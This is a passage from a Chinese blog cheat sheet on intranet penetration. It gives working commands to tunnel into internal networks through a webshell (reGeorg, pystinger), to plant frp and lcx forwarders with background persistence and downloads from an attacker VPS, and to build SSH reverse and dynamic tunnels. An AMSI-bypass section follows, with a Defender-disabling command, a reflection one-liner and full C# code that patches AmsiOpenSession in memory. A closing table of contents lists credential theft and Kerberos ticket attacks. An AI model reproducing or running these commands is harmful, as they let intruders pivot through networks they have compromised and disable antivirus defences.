<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -R <span class="number">2222</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">22</span> -p <span class="number">80</span> root@<span class="number">192.168</span><span class="number">.0</span><span class="number">.230</span></span><br><span class="line">(输入外网主机的<span class="variable constant_">SSH</span>口令)</span><br></pre></td></tr></table></figure>
<p>2. 在外网主机上执行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -D <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span> -p <span class="number">2222</span> avfisher@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">(输入内网主机的<span class="variable constant_">SSH</span>口令)</span><br></pre></td></tr></table></figure>
<p>3. 在外网主机上配置 proxychains 设置 socks4 代理</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/proxychains.<span class="property">conf</span></span><br><span class="line">[<span class="title class_">ProxyList</span>]</span><br><span class="line">socks4 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>
<p>4. 使用 proxychains 代理所有流量进入内网</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nc -nv <span class="number">10.0</span><span class="number">.2</span><span class="number">.5</span> <span class="number">3306</span></span><br></pre></td></tr></table></figure>
<h6 id="场景三tcp不出网-http代理"><a class="markdownIt-Anchor" href="#场景三tcp不出网-http代理">#</a> 场景三：TCP 不出网 - HTTP 代理</h6>
<p><strong>一.reGeorg</strong></p>
<p>reGeorg 原版：<a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br>
reGeorg 修改版：<a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
<p>假设拿到的 Webshell 是<a target="_blank" rel="noopener" href="http://aaa.com/shell.jsp%EF%BC%8C%E4%BB%A5%E5%8E%9F%E7%89%88reGeorg%E4%B8%BA%E4%BE%8B%E3%80%82"> http://aaa.com/shell.jsp，</a>以原版 reGeorg 为例。</p>
<p>上传 reGeorg 中的 tunnel.jsp，假设当前 URL 为 http://aaa.com/tunnel.jsp</p>
<p>在本地 PC 运行如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 8080 -h 0.0.0.0 -u http://aaa.com/tunnel.jsp</span><br></pre></td></tr></table></figure>
<p>此时，将在本地 PC 的 8080 开启一个 Socks 端口，使用 Proxifier 即可进行代理。需要注意的是，由于这个 http 代理隧道比较脆弱，建议根据每个目标 host 单独添加规则，最好不要设置成全局代理。</p>
<p><strong>二.pystinger</strong></p>
<p>蜂刺 - stinger_client</p>
<p><a target="_blank" rel="noopener" href="https://github.com/FunnyWolf/pystinger">pystinger</a></p>
<p>整体结构：</p>
<p>1. 上传 proxy.jsp 到目标 Web 服务器，上传 stinger_server/stinger_server.exe 到目标系统。</p>
<p>2. 使用 Webshell 启动 stinger_server</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">chmod +x /tmp/stinger_server</span><br><span class="line">nohup /tmp/stinger_server&gt;/dev/null nohup.out &amp;</span><br><span class="line"></span><br><span class="line">Windows: start D:/XXX/stinger_server.exe</span><br></pre></td></tr></table></figure>
<p>3.VPS 服务端启动监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./stinger_client -w http://aaa.com/proxy.jsp -l 0.0.0.0 -p 60000</span><br></pre></td></tr></table></figure>
<p>以上操作成功后，VPS 会监听 60000 端口，接下来直接配置好 Proxifier 就可以访问目标内网了。</p>
<p>特别注意：这个代理也不是很稳定，有时候会断开 (Wrong data)。遇到断开情况后，手动 kill stinger_server 进程 再启动，最后重启 VPS 服务端 stinger_client 即可</p>
<h6 id="场景四tcp出网-socks代理"><a class="markdownIt-Anchor" href="#场景四tcp出网-socks代理">#</a> 场景四	TCP 出网 - socks 代理</h6>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">frp</a></strong></p>
<p>搭建步骤：<br>
1.VPS 运行服务端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
<p>注：建议用 Screen 将 frp 挂起到后台，Screen 挂起程序参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b24f597c0561">用 screen 在后台运行程序 - 简书</a></p>
<p>frps.ini 内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 8080</span><br><span class="line">tls_only = true</span><br><span class="line">tcp_mux = true</span><br><span class="line">privilege_token = token123</span><br><span class="line">kcp_bind_port = 8080</span><br></pre></td></tr></table></figure>
<p>2. 使用 VPS 将 frpc frpc.ini 上传到主机 tmp 目录，然后运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">chmod +x /tmp/frpc-x86</span><br><span class="line">nohup /tmp/frpc-x86 -c /tmpfrpc.ini&gt;/dev/null nohup.out &amp;</span><br><span class="line"></span><br><span class="line">Windows</span><br><span class="line">frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
<p>注：有时候用 Webshell 管理工具会上传失败或上传文件不完整，可以 cd 到 frp 目录，在 vps 使用  <code>python -m SimpleHTTPServer 80</code>  启动一个 webserver，然后在客户端使用  <code>curl http://vpsip/frpc</code>  下载文件。</p>
<p>以上操作成功后，VPS 控制台会有输出，然后 VPS 会启动一个 10001 端口，接下来直接配置好 Proxifier 就可以访问目标内网了。</p>
<p>Proxifier 使用参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u013600314/article/details/106276126/">Proxifier Socks5 代理（内网访问、远程办公）</a></p>
<p>ps：frp 会涉及到免杀的问题，这里推荐另一个代理工具，体积更小，可以看作是 rust 版本的 frp</p>
<p><a target="_blank" rel="noopener" href="https://github.com/editso/fuso">fuso</a></p>
<h4 id="0x02-lcx"><a class="markdownIt-Anchor" href="#0x02-lcx">#</a> 0x02 Lcx</h4>
<p>内网 IP：192.168.183.168<br>
 公网 IP：192.168.183.181</p>
<h5 id="端口转发"><a class="markdownIt-Anchor" href="#端口转发">#</a> 端口转发</h5>
<p>内网机器上执行命令： <code>lcx.exe –slave 公网IP 端口 内网IP 端口</code> <br>
将内网的 3389 端口转发到公网的 6666 端口</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx.<span class="property">exe</span> -slave <span class="number">192.168</span><span class="number">.183</span><span class="number">.181</span> <span class="number">6666</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.168</span> <span class="number">3389</span></span><br><span class="line">lcx.<span class="property">exe</span> -slave <span class="number">192.168</span><span class="number">.183</span><span class="number">.181</span> <span class="number">6666</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span></span><br></pre></td></tr></table></figure>
<p>公网机器上执行命令： <code>lcx.exe -listen 监听端口 连接端口</code> <br>
将在 6666 端口接收到的数据转发到 2222 端口</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.<span class="property">exe</span> -listen <span class="number">6666</span> <span class="number">2222</span></span><br></pre></td></tr></table></figure>
<p>使用命令 <code>mstsc /v:127.0.0.1:2222</code>  即可连接到内网 3389 端口</p>
<h5 id="端口映射"><a class="markdownIt-Anchor" href="#端口映射">#</a> 端口映射</h5>
<p>如果内网机器防火墙禁止 3389 出站，可以使用 tran 命令将 3389 端口映射到其他端口上<br>
内网机器上执行命令： <code>lcx.exe -tran 映射端口 连接IP 连接端口</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.<span class="property">exe</span> -tran <span class="number">66</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.168</span> <span class="number">3389</span></span><br></pre></td></tr></table></figure>
<p>因为实验环境是内网所以直接连接 66 端口即可访问 3389 端口，公网还需要端口转发</p>
<h4 id="0x03-ssh隧道"><a class="markdownIt-Anchor" href="#0x03-ssh隧道">#</a> 0x03  SSH 隧道</h4>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ssh参数详解：</span><br><span class="line">    -C <span class="title class_">Enable</span> compression 压缩数据传输</span><br><span class="line">    -q <span class="title class_">Quiet</span> mode. 安静模式</span><br><span class="line">    -T <span class="title class_">Disable</span> pseudo-tty allocation. 不占用 shell</span><br><span class="line">    -f <span class="title class_">Requests</span> ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数</span><br><span class="line">    -N <span class="title class_">Do</span> not execute a remote command. 不执行远程命令，端口转发就用它</span><br><span class="line">    -L <span class="attr">port</span>:<span class="attr">host</span>:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. </span><br><span class="line">    -R <span class="attr">port</span>:<span class="attr">host</span>:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. </span><br><span class="line">    -D port 指定一个本地机器动态的应用程序端口转发. </span><br><span class="line">    -g port 允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接</span><br></pre></td></tr></table></figure>
<h5 id="ssh本地转发"><a class="markdownIt-Anchor" href="#ssh本地转发">#</a> SSH 本地转发</h5>
<p>语法格式：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L [<span class="attr">local_bind_addr</span>:]<span class="attr">local_port</span>:<span class="attr">remote</span>:remote_port middle_host</span><br></pre></td></tr></table></figure>
<p>远程管理服务器上的 mysql，mysql 不能直接 root 远程登陆。这时候就可以通过本地转发，通过 ssh 将服务器的 3306 端口转发到 1234 端口。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -<span class="title class_">CfNg</span> -L <span class="number">2222</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3306</span> root@<span class="number">139.196</span>.<span class="property">xx</span>.<span class="property">xx</span></span><br></pre></td></tr></table></figure>
<p>工作原理：在本地指定一个由 ssh 监听的转发端口 2222，将远程主机的 3306 端口 (127.0.0.1:3306) 映射到本地的 2222 端口，当有主机连接本地映射的 2222 端口时，本地 ssh 就将此端口的数据包转发给中间主机 VPS，然后 VPS 再与远程主机端口 (127.0.0.1:3306) 通信。<br>
数据流向：Kali -&gt; 2222 -&gt; VPS -&gt; 127.0.0.1:3306</p>
<h5 id="ssh远程转发"><a class="markdownIt-Anchor" href="#ssh远程转发">#</a> SSH 远程转发</h5>
<p>语法格式：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R [<span class="attr">bind_addr</span>:]<span class="attr">remote1_port</span>:<span class="attr">host</span>:port remote1</span><br></pre></td></tr></table></figure>
<p>假设 kali 开了一个 80 端口的 web 服务，外网无法访问，使用远程转发，将 kali 的 80 端口转发到外网的其他端口，这时候访问外网的端口，就访问到了内网的端口。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -<span class="title class_">CfNg</span> -R <span class="number">4444</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span> root@<span class="number">192.168</span><span class="number">.183</span><span class="number">.195</span></span><br></pre></td></tr></table></figure>
<p>此时在 192.168.183.195 这台主机上访问 127.0.0.1:4444 端口即可访问到 kali 的 80 端口<br>
工作原理：kali 在请求外网主机的 sshd 服务，在外网主机上建立一个套接字监听端口 (4444)，它是 kali 的 80 端口的映射，当有主机连接外网的 4444 端口时，连接的数据全部转发给 kali，再由 kali 去访问 127.0.0.1:80。</p>
<p>这里要注意一点，远程端口转发是由远程主机上的 sshd 服务控制的，默认配置情况下，sshd 服务只允许本地开启的远程转发端口 (4444) 绑定在环回地址 (127.0.0.1) 上，即使显式指定了 bind_addr 也无法覆盖。也就是这里访问 127.0.0.1:4444 端口可以访问成功，访问 192.168.183.195:4444 却不能访问成功。</p>
<p>要允许本地的远程转发端口绑定在非环回地址上，需要在外网主机的 sshd 配置文件中启用 &quot;GatewayPorts&quot; 项，它的默认值为 no，这里将它改为 yes。然后重新远程转发一下即可用外网地址访问。</p>
<h5 id="ssh动态转发正向代理做动态的端口转发"><a class="markdownIt-Anchor" href="#ssh动态转发正向代理做动态的端口转发">#</a> SSH 动态转发，正向代理做动态的端口转发</h5>
<p>本地或远程转发端口和目标端口所代表的应用层协议是一对一的关系，不同的服务就要建立不同的端口，工作很是繁琐，而动态转发只需绑定一个本地端口，而目标端口是根据你发起的请求决定的，比如请求为 445 端口，通过 ssh 转发的请求也是 445 端口。</p>
<p>语法格式：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D [<span class="attr">bind_addr</span>:]port remote</span><br></pre></td></tr></table></figure>
<p>这里举一个最简单的列子：翻墙。国内正常情况下上不了 Google，我们可以通过将流量转发到国外的 vps 上这样就可以正常访问了。<br>
在本地执行以下命令，并查看建立连接情况</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -<span class="title class_">Nfg</span> -D <span class="number">3333</span> root@<span class="number">45.77</span>.<span class="property">xx</span>.<span class="property">xx</span></span><br></pre></td></tr></table></figure>
<p>连接建立成功，设置浏览器到本地主机的 3333 端口</p>
<h5 id="ssh动态转发正向代理进行单一的端口转发"><a class="markdownIt-Anchor" href="#ssh动态转发正向代理进行单一的端口转发">#</a> SSH 动态转发，正向代理进行单一的端口转发</h5>
<p>利用 ssh -L 提供正向代理，将 192.168.183.2 的 80 端口映射到 45.77.xx.xx 的 1111 端口上</p>
<p>访问 45.77.xx.xx:1111 相当于访问 192.168.183.2:80 中间需要 192.168.183.1 的 ssh 进行正向代理进行利用。</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 45.77.xx.xx:1111:192.168.183.2:80 root@192.168.183.1</span><br></pre></td></tr></table></figure>
<p>此时我们访问 45.77.xx.xx 的 1111 端口就相当于访问内网不出网机器的 192.168.183.2:80</p>
<h1 id="16bypass-amsi"><a class="markdownIt-Anchor" href="#16bypass-amsi">#</a> 16.Bypass AMSI</h1>
<p><a target="_blank" rel="noopener" href="https://0range-x.github.io/2022/01/23/AMSI/">How to Bypass AMSI </a></p>
<p>管理员权限关闭 amsi</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure>
<h3 id="一键关闭amsi"><a class="markdownIt-Anchor" href="#一键关闭amsi">#</a> 一键关闭 AMSI</h3>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>).GetField(<span class="string">&#x27;amsiInitFailed&#x27;</span>,<span class="string">&#x27;NonPubilc,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure>
<p>被加黑了，可以混淆过</p>
<h3 id="powershell降级"><a class="markdownIt-Anchor" href="#powershell降级">#</a> powershell 降级</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -version 2   //改变powershell运行版本</span><br></pre></td></tr></table></figure>
<h3 id="内存补丁"><a class="markdownIt-Anchor" href="#内存补丁">#</a> 内存补丁</h3>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$p=<span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Linq;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public class Program</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr LoadLibrary(string name);</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,</span></span><br><span class="line"><span class="string">uint flNewProtect, out uint lpfloldProtect);</span></span><br><span class="line"><span class="string">public static void Bypass()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">String a =</span></span><br><span class="line"><span class="string">&quot;</span>isma<span class="string">&quot;;</span></span><br><span class="line"><span class="string">IntPtr lib = LoadLibrary(String.Join(&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">, a.Reverse().ToArray()) +</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">.dll<span class="string">&quot;);</span></span><br><span class="line"><span class="string">IntPtr addr = GetProcAddress(lib,</span></span><br><span class="line"><span class="string">&quot;</span>AmsiOpenSession<span class="string">&quot;);</span></span><br><span class="line"><span class="string">uint old = 0;</span></span><br><span class="line"><span class="string">byte[] p;</span></span><br><span class="line"><span class="string">p = new byte[6];</span></span><br><span class="line"><span class="string">p[0] = 0xB8;</span></span><br><span class="line"><span class="string">p[1] = 0xFF;</span></span><br><span class="line"><span class="string">p[2] = 0xFF;</span></span><br><span class="line"><span class="string">p[3] = 0xFF;</span></span><br><span class="line"><span class="string">p[4] = 0xFF;</span></span><br><span class="line"><span class="string">p[5] = 0xC3;</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);</span></span><br><span class="line"><span class="string">Marshal.Copy(p, 0, addr, p.Length);</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, old, out old);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;</span>@</span><br><span class="line">Add-Type $p</span><br><span class="line">[<span class="meta">Program</span>]::Bypass()</span><br></pre></td></tr></table></figure>
<p>参考链接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/NyDubh3/Pentesting-Active-Directory-CN</span><br><span class="line">https://github.com/shmilylty/Intranet_Penetration_Tips</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/blog/">首页</a></li>
        
          <li><a href="/blog/about/">关于</a></li>
        
          <li><a href="/blog/archives/">归档</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/tymolu233">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E6%97%A0%E5%87%AD%E8%AF%81%E6%83%85%E5%86%B5%E4%B8%8B"><span class="toc-number">1.</span> <span class="toc-text"> 1. 无凭证情况下</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text"> 网络扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BF%AB%E9%80%9F%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text"> 漏洞快速探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text"> 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%A5%E6%9C%89%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="toc-number">1.4.</span> <span class="toc-text"> 拥有本地管理员权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 获取密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87lsa%E9%98%B2%E6%8A%A4%E7%AD%96%E7%95%A5%E8%AF%BB%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 绕过 LSA 防护策略读取密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#token%E7%AA%83%E5%8F%96"><span class="toc-number">1.4.3.</span> <span class="toc-text"> token 窃取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.4.</span> <span class="toc-text"> 查看本地存储的所有密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E6%89%80%E6%9C%89hash"><span class="toc-number">1.4.5.</span> <span class="toc-text"> 卷影拷贝（获取域控所有 hash）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dpapi%E8%A7%A3%E5%AF%86"><span class="toc-number">1.4.6.</span> <span class="toc-text"> dpapi 解密</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text"> 2. 内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text"> 本机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 8. 获取当前用户密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#windows"><span class="toc-number">2.1.1.1.</span> <span class="toc-text"> Windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux"><span class="toc-number">2.1.1.2.</span> <span class="toc-text"> Linux</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">2.1.1.3.</span> <span class="toc-text"> 浏览器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#navicat%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.1.4.</span> <span class="toc-text"> Navicat 密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xshellxftp%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.1.5.</span> <span class="toc-text"> xshell&amp;xftp 密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mremoteng%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.1.6.</span> <span class="toc-text"> mRemoteNG 密码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E6%95%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.2.</span> <span class="toc-text"> 扩散信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 常用端口扫描工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8B%93%E6%89%91%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 内网拓扑架构分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.3.</span> <span class="toc-text"> 常见信息收集命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.2.4.</span> <span class="toc-text"> 第三方信息收集</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text"> 3. 获取域控的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#sysvol"><span class="toc-number">3.0.0.0.1.</span> <span class="toc-text"> SYSVOL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ms14-068-kerberos"><span class="toc-number">3.0.0.0.2.</span> <span class="toc-text"> MS14-068 Kerberos</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#spn%E6%89%AB%E6%8F%8F"><span class="toc-number">3.0.0.0.3.</span> <span class="toc-text"> SPN 扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#kerberos%E7%9A%84%E9%BB%84%E9%87%91%E9%97%A8%E7%A5%A8"><span class="toc-number">3.0.0.0.4.</span> <span class="toc-text"> Kerberos 的黄金门票</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#kerberos%E7%9A%84%E9%93%B6%E7%A5%A8%E5%8A%A1"><span class="toc-number">3.0.0.0.5.</span> <span class="toc-text"> Kerberos 的银票务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%9F%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7%E7%A0%B4%E8%A7%A3"><span class="toc-number">3.0.0.0.6.</span> <span class="toc-text"> 域服务账号破解</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%AD%E8%AF%81%E7%9B%97%E7%AA%83"><span class="toc-number">3.0.0.0.7.</span> <span class="toc-text"> 凭证盗窃</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ntlm-relay"><span class="toc-number">3.0.0.0.8.</span> <span class="toc-text"> NTLM relay</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#kerberos%E5%A7%94%E6%B4%BE"><span class="toc-number">3.0.0.0.9.</span> <span class="toc-text"> Kerberos 委派</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 